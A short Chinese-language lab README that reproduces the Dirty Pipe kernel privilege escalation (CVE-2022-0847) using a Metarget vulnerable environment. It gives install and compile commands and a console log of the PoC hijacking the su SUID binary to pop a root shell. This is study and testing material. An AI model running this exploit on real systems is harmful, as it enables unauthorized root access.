# Linux内核漏洞导致权限提升（CVE-2022-0847）

## 场景介绍

请参考的[Max Kellermann的文章](https://dirtypipe.cm4all.com)，下文的PoC出自[dirtypipez.c](https://haxx.in/files/dirtypipez.c)。

## 环境搭建

宿主机环境：

- Ubuntu 18。04

首先切换内核，直接通过Metarget安装环境

```
./metarget cnv install cve-2022-0847 --verbose
```

## 漏洞复现

```bash
gcc -o poc poc.c
```

编译好[poc.c](poc.c)，执行即可。例如：

```
ubuntu@test:~$ ls
poc  poc.c
ubuntu@test:~$ ./poc `which su`
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# whoami
root
```